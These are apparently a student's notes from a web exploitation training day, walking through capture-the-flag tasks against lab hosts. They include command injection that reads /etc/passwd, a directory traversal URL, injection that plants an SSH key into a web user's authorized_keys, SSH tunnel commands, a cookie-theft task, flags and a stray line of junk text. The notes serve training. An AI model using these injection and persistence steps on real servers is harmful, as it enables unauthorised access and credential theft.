## CCTC Security Day 2
- agenda


## Admin Data 

### CTFd info
| Field | Value | 
|-|-|
| Flag | W3B3xpl01t5t@rt0F@ct1v1ty | 

## Day 2: Web Exploitation

### Server/Client Relationship
- Synchronous communications between user and services all data is not returned, client only recieves what is allowed

### **Hypertrext Transfer Protocol (HTTP):**

- request/Reply
- Various tools to view --> tcpdump, wireshark, dev console
- ex: `Get / HTTP/1.1`
- response: `HTTP/1.1 200 OK`

#### HTTP Methods

- **GET**
- HEAD
-**POST**
- Put
- [website](https://tools.ietf.org/html/rfc2616)

#### HTTP Response Codes
- 10X == Informational
- 2XX == Success
- 30X == Redirection
- 4XX == Client Error
- 5XX == Server Error
- [website](https://tools.ietf.org/html/rfc2616)

#### HTTP Fields
- User-Agent
- Referer
- Cookie
- Date
- Server
- Set-Cookie

**Starting Demo [HTML](http://10.50.27.53/webexample/), [Java](http://10.50.27.53/java/), [Cross](http://10.50.27.53/cross/)**

### **Enumeration Tools**
- <\website/>/robots.txt (indexs websites to see how things are linked for you)
- Tools: NSE scripts, nikto, Burp suite

## ***SUPER IMPORTANT SCAN*** only use on scans you have permissions on
- `nmap -Pn <\ip/> --script http-enum`

## set up python server to get cookies
- `python3 -m http.server <\port (or default to 8000)>`


# cmd injection
## ssh keys
- find `etc/passwd`
- `;mkdir var/www/.ssh`
`ssh-keygen -t rsa`
- be sure to press enter for no passphrase 
- `cat /home/student/.ssh/id_rsa.pub`
    - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDO5Rb2Ttlw+F08GfRCAvT7yfPRtMUS5UN/noD2/n7Jsp0UsA3+6rV37CqkHro/3UEMT/0TujlPgzMlQvD7wJQbhS+QxJbbiZsibWFHOmJ98w9miCmauMdeJWj8v8WnhAicVL3rCaBYZ8Qz/IDjPabWhBUkU41lCjAuVde79T3tSZ8lqt3PRBK2488nUu5QHVyn/0qRwZlHG1u33KhIB1oO7Tr71kfpijWBGchoDV+hooqPCZ1BsdAkdJu7Z4dNCrPVpjKnuWiwdCMGlNtaUbuEMAT5Ma9o4RzbFSDQB0fi0Tt+AR3fMcr9qyi9fQfaec1UzJfxsKMUPVGXxWMYMZjf student@linux-opstation-xns7
- `;echo "<\key" >> var/www/.ssh/authoried_keys`

- <HTML><BODY>
<FORM METHOD = >


***
***
## CTF INFO:
Scheme of Maneuver:
>internet_grey_host
-->T1:10.100.28.40

Target Section:

T1
Hostname: Donovian_MI_websvr
IP: 10.100.28.40
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.

***


        enumerate this 10.100.28.40
        1. `proxychains nmap -Pn 10.100.28.40 --script http-enum`
        Nmap scan report for 10.100.28.40
        Host is up (0.0019s latency).
        Not shown: 998 closed ports
        PORT     STATE SERVICE
        80/tcp   open  http
        http-enum: 
        /robots.txt: Robots file
        /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
        /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)
        /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
        4444/tcp open  krb524


        2.  firefox
        - dig around the site, don't find much
        - try robots.txt
        - click on 'industry_check.php'

1. Basic HTTP Understanding 

    Training Website

    We have an asset that is trying to gain employment into the Ministry, however intelligence does not know the IP address of training web site. Our asset has stated that the training site may only be communicated with from the Ministry web site. We have reason to believe that the MI website might have a message saved inside the web server directory. Once we have located the address analyze that website and determine how to produce a certificate of completion, utilizing the Cyber Training Portal.

    - get to training site
    - do control u to see functions used to make test
    - contol f12 to see user-agent. go to console
    - call the function
    - put in name
    - 2dIV5GGStmxRvi7VpN9w

2. VIP Email address

    Through website reconnaissance, what is Romanoff's email address?

    - go to training website http://10.100.28.40/net_test/industry_check.php?IP=&Path=&Stat=
    - click on troubleticket
    - trouble ticket says to checkout "contract_bids.html`
    - check 10.100.28.10/contract_bids.html
    - N.Romanoff@MI.ru

3. Directory


        Training Website

        Having the ability to now communicate with the training web site, identify any vulnerabilities that could lead to intelligence collection.

        Once identified utilize that vulnerability to obtain the flag from where information about user is configured on the system.
        - http://10.100.28.55/books_pick.php?book=/../../../../../etc/passwd
        - ddnTkud91V0eZbpvEhXI

4. Command injection 2

        Natasha Romanoff has been identified as a major contracting officer for the Ministry. Intelligence suggests that she may have a file on system which will identify which companies are contracted to work on sensitive projects.

        Investigate Ministry website and identify vulnerabilities which could allow collection through usage of command injection, directory traversal, or unrestricted file upload

5. Stored Cross

        Intel has found that by policy the Admin must check the Trouble Ticketing system every few minutes. Team lead orders are to "obtain" the Admins cookie.
YdY8vrRGOsRfhy6
6. Command line injection 1

        Identify the user that the MI website is running as and relevant information about their user environment.

        1. I    NDUSTRY CHECK website
        2. use teh second web 
        3. `whoami` => www-data
        4. ;cat /etc/passwd
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/usr/sbin/nologin
        man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
        www-data:x:33:33:you found me vm4B7tY8qpadtg3ZXmWq:/var/www:/bin/bash
        backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
        list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
        irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
        gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
        nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
        systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
        systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
        syslog:x:102:106::/home/syslog:/usr/sbin/nologin
        messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
        _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
        lxd:x:105:65534::/var/lib/lxd/:/bin/false
        uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
        dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
        landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
        sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
        pollinate:x:110:1::/var/cache/pollinate:/bin/false
        ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
        mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
        mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/fals

        - vm4B7tY8qpadtg3ZXmWq
7. Training Site Location

        What is the IPv4 address of the Training Site website?
        - firefox
        - 10.100.28.40/uploads
        - message
        - Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
        Please send me a corrected cert with the right now.
        I took my online training from the following website
        - 10.100.28.55

8. Malicious Uppload 

        Gain initial access to the web server located at 10.100.28.40.

        What is the greeting when logging into the system?



***
## NOT SURE WHERE THIS GOES BUT HERE IS HOW I GOT CREDS TO GET ONTO THE BOX

- find `etc/passwd`
- `;mkdir var/www/.ssh`
`ssh-keygen -t rsa` on opbox
- be sure to press enter for no passphrase 
- `cat /home/student/.ssh/id_rsa.pub`
    - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDO5Rb2Ttlw+F08GfRCAvT7yfPRtMUS5UN/noD2/n7Jsp0UsA3+6rV37CqkHro/3UEMT/0TujlPgzMlQvD7wJQbhS+QxJbbiZsibWFHOmJ98w9miCmauMdeJWj8v8WnhAicVL3rCaBYZ8Qz/IDjPabWhBUkU41lCjAuVde79T3tSZ8lqt3PRBK2488nUu5QHVyn/0qRwZlHG1u33KhIB1oO7Tr71kfpijWBGchoDV+hooqPCZ1BsdAkdJu7Z4dNCrPVpjKnuWiwdCMGlNtaUbuEMAT5Ma9o4RzbFSDQB0fi0Tt+AR3fMcr9qyi9fQfaec1UzJfxsKMUPVGXxWMYMZjf student@linux-opstation-xns7
- `;echo "<\key" >> /var/www/.ssh/authoried_keys`
- kill your proxychains
- ssh student@10.50.36.131 -L 1100:10.100.28.40:4444
-  ssh -p 1100 www-data@localhost -D 9050

; mkdir /var/www/.ssh


dafdasghjksfdhajklagsdvgiru2132132131uih2uihrbuiafhsidfhahf#$%%$%^%&^&^%^%$%GBkjdhfjksdafhkjdasbfkjdsafgdkasbfhGHJNDSHFND:KBBEBYUw
